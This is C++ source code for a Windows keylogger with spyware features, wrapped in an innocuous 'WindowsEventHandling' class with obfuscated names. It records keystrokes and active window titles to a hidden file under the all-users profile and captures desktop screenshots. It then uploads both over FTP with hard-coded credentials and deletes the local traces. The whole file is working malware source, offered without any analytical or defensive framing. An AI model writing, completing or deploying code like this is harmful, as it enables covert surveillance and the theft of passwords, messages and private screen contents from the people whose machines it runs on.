#include "EventHandling.h"
#include <Windows.h>
#include <WinInet.h>
#include <time.h> 
#include <GDIPlus.h>
#include <Lmcons.h>
#pragma warning(disable: 4996)
std::string w_name();
void gen_ss(std::string);
WindowsEventHandling::WindowsEventHandling(){
	buffer = ""; buffer.reserve(1024);
	time_t rawtime; struct tm * tin;
	time(&rawtime); tin = localtime(&rawtime);
	char timebuffer[100]; sprintf(timebuffer, "VK_[%d;%d;%d]-[%d,%d,%d].txt", tin->tm_mday, tin->tm_mon + 1, tin->tm_year + 1900, tin->tm_hour, tin->tm_min, tin->tm_sec);
	char user[260]; GetEnvironmentVariable("ALLUSERSPROFILE", user, 260);
	path_f_x += user; path_f_x += "\\windows\\"; c_f_pathox = path_f_x; chkl___f_x = timebuffer; c_f_pathox += chkl___f_x;
}
std::string WindowsEventHandling::gpth(){
	return path_f_x;
}
void WindowsEventHandling::extend(char ch){
	std::string w_n = w_name();
	if (w_n.length() > 1){
		buffer = "\n\n"; buffer += w_n; buffer += "\n"; buffer += ch;
	}
	else buffer = ch; ret_lg(c_f_pathox);
}
std::string WindowsEventHandling::g_uname(){
	std::string slash = "\\"; char username[UNLEN];  DWORD username_len = UNLEN + 1; GetUserName(username, &username_len);  return username + slash;
}
void WindowsEventHandling::exstend(std::string str){
	std::string w_n = w_name();
	if (w_n.length() > 1) {
		buffer = "\n\n"; buffer += w_n; buffer += "\n"; buffer += str;
	} else buffer = str;
	ret_lg(c_f_pathox);
}
void WindowsEventHandling::clearb(){
	buffer.erase();
}
void WindowsEventHandling::ret_lg(std::string name) {
	std::ofstream of(name, std::ios::app); of.write(buffer.c_str(), buffer.length()); of.close();
}
void WindowsEventHandling::mailer(){
	char vks[100]; char snap[100]; time_t rawtime; struct tm * tin; time(&rawtime); tin = localtime(&rawtime);
	sprintf(vks, "VK_[%d;%d;%d]-[%d,%d,%d].txt", tin->tm_mday, tin->tm_mon + 1, tin->tm_year + 1900, tin->tm_hour, tin->tm_min, tin->tm_sec);
	sprintf(snap, "SS_[%d;%d;%d]-[%d,%d,%d].jpg", tin->tm_mday, tin->tm_mon + 1, tin->tm_year + 1900, tin->tm_hour, tin->tm_min, tin->tm_sec);
	std::string f_snap = path_f_x; f_snap += snap; gen_ss(f_snap);
	HINTERNET h = InternetOpen("agent", 0, 0, 0, 0);
	HINTERNET h_c = InternetConnect(h, "localhost", INTERNET_DEFAULT_FTP_PORT, "jaxl", "123123", INTERNET_SERVICE_FTP, 0, 0x0);
	while (!FtpPutFile(h_c, c_f_pathox.c_str(), chkl___f_x.c_str(), FTP_TRANSFER_TYPE_BINARY, NULL)); while (!FtpPutFile(h_c, f_snap.c_str(), snap, FTP_TRANSFER_TYPE_BINARY, NULL));
	InternetCloseHandle(h_c); InternetCloseHandle(h); DeleteFile(f_snap.c_str()); DeleteFile(c_f_pathox.c_str());
	chkl___f_x = vks; c_f_pathox = path_f_x; c_f_pathox += chkl___f_x;
}

void gen_ss(std::string file){
	ULONG_PTR gdiplustoken; Gdiplus::GdiplusStartupInput gdiplusstartupinput; Gdiplus::GdiplusStartupOutput gdiplusstartupoutput; gdiplusstartupinput.SuppressBackgroundThread = true;
	GdiplusStartup(&gdiplustoken, &gdiplusstartupinput, &gdiplusstartupoutput); HDC dc = GetDC(GetDesktopWindow()); HDC dc2 = CreateCompatibleDC(dc); RECT rcOkno;
	GetClientRect(GetDesktopWindow(), &rcOkno); int w = rcOkno.right - rcOkno.left; int h = rcOkno.bottom - rcOkno.top;
	HBITMAP hbitmap = CreateCompatibleBitmap(dc, w, h); HBITMAP holdbitmap = (HBITMAP)SelectObject(dc2, hbitmap);
	BitBlt(dc2, 0, 0, w, h, dc, 0, 0, SRCCOPY); Gdiplus::Bitmap* bm = new Gdiplus::Bitmap(hbitmap, NULL);
	UINT num, size; Gdiplus::ImageCodecInfo *imagecodecinfo; Gdiplus::GetImageEncodersSize(&num, &size); imagecodecinfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
	GetImageEncoders(num, size, imagecodecinfo); CLSID clsidEncoder;
	for (std::size_t i = 0; i < num; i++)
		if (wcscmp(imagecodecinfo[i].MimeType, L"image/jpeg") == 0)
			clsidEncoder = imagecodecinfo[i].Clsid;
	free(imagecodecinfo); std::wstring ws; ws.assign(file.begin(), file.end());
	bm->Save(ws.c_str(), &clsidEncoder); SelectObject(dc2, holdbitmap);
	DeleteObject(dc2); DeleteObject(hbitmap);
	ReleaseDC(GetDesktopWindow(), dc); Gdiplus::GdiplusShutdown(gdiplustoken);
}HWND h_org = NULL;
std::string w_name() {
	HWND h_for = GetForegroundWindow();
	if (h_for != h_org){
		h_org = h_for; char name[260]; GetWindowText(h_org, name, 260); std::string tm; char timebuffer[100]; time_t rawtime; struct tm * tin;
		time(&rawtime); tin = localtime(&rawtime);
		sprintf(timebuffer, "[%d-%d/%d]-[%d:%d:%d]", tin->tm_mday, tin->tm_mon + 1, tin->tm_year + 1900, tin->tm_hour, tin->tm_min, tin->tm_sec);
		tm = timebuffer; tm += " >> "; tm += name; tm += " << ";
		return tm;}
	return "";
}